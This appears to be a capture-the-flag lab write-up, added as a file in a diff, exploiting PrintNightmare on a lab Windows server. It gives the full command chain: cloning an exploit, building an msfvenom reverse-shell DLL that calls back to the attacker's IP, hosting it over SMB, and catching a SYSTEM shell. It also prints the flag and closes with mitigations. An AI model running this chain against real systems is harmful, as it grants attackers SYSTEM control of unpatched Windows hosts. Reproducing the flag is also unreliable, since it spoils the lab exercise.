@@ -1,0 +1,84 @@
+Day 7 — PrintNightmare (CVE-2021-1675 / CVE-2021-34527) → SYSTEM
+Abuse the Windows Print Spooler's remote driver-install RPC (`RpcAddPrinterDriverEx`)
+to make the target load an attacker-hosted DLL as SYSTEM, catch a reverse shell, and
+read the Administrator flag.
+
+Item	Value
+Target	10.10.0.113 (Windows Server 2016, Spooler enabled)
+Attacker (Kali)	100.100.4.255 (`tun0`)
+Login	User / 123456
+Result	nt authority\system
+🚩 Flag	cybered{Pr1ntN1ghtm4r3_Expl01t3d}
+Why it works
+The Print Spooler (`spoolsv.exe`) runs as SYSTEM and, over MS-RPRN/MS-PAR, lets
+clients install printer drivers remotely. PrintNightmare is a broken privilege check:
+any authenticated user can point RpcAddPrinterDriverEx at \attacker\share\evil.dll
+and the SYSTEM spooler downloads and loads it. Spooler is on by default → low-priv user
+to SYSTEM in one hop.
+
+Exploitation — sequential
+1. Get the exploit
+Bash
+
+
+git clone https://github.com/cube0x0/CVE-2021-1675.git
+cd CVE-2021-1675
+2. Build the reverse-shell DLL (LHOST = your tun0 IP)
+Bash
+
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=100.100.4.255 LPORT=1337 -f dll -o /tmp/print.dll
+3. Host it over SMB (own terminal)
+Bash
+
+
+impacket-smbserver -smb2support share /tmp/
+4. Start the listener (own terminal)
+Bash
+
+
+nc -lvnp 1337
+5. Fire the exploit — spooler loads our DLL as SYSTEM
+Bash
+
+
+python3 ./CVE-2021-1675.py User:123456@10.10.0.113 '\\100.100.4.255\share\print.dll'
+copy
+
+
+[+] Bind OK
+[+] pDriverPath Found ...\UNIDRV.DLL
+[*] Executing \??\UNC\100.100.4.255\share\print.dll
+PrintNightmare is racy — the run may end in STATUS_PIPE_CLOSING yet still fire the
+DLL. Watch the listener, not the error.
+6. Catch the SYSTEM shell + read the flag
+copy
+
+
+whoami
+nt authority\system
+
+dir /s /b C:\Users\Administrator\*flag*
+C:\Users\Administrator\Desktop\flag.txt.txt        <-- double extension, not flag.txt
+
+type C:\Users\Administrator\Desktop\flag.txt.txt
+cybered{Pr1ntN1ghtm4r3_Expl01t3d}
+The direct type ...\flag.txt returned "cannot find the file" — the real file was
+flag.txt.txt. When a type misses, enumerate with dir /s /b ...flag.
+Commands used
+Command	Purpose
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=100.100.4.255 LPORT=1337 -f dll -o /tmp/print.dll	Reverse-shell DLL
+impacket-smbserver -smb2support share /tmp/	Host the DLL over SMB
+nc -lvnp 1337	Listener
+python3 ./CVE-2021-1675.py User:123456@10.10.0.113 '\100.100.4.255\share\print.dll'	Trigger SYSTEM DLL load
+dir /s /b C:\Users\Administrator*flag* / type ...flag.txt.txt	Find + read the flag
+Notes / gotchas
+Impacket tools use the impacket- prefix here (`impacket-rpcdump`, `impacket-smbserver`).
+LHOST and the UNC path must both be your tun0 IP or the callback/SMB fetch fails.
+STATUS_PIPE_CLOSING / Stage0: 0 is normal — re-run and watch the listener.
+Raw reverse shell double-echoes keystrokes (cosmetic).
+Mitigations
+Patch CVE-2021-34527; set RestrictDriverInstallationToAdministrators = 1.
+Disable the Spooler where unneeded (esp. DCs): Stop-Service Spooler; Set-Service Spooler -StartupType Disabled.
+Alert on spoolsv.exe loading DLLs from the spool drivers dir (Sysmon 7/11).
+🚩 cybered{Pr1ntN1ghtm4r3_Expl01t3d}
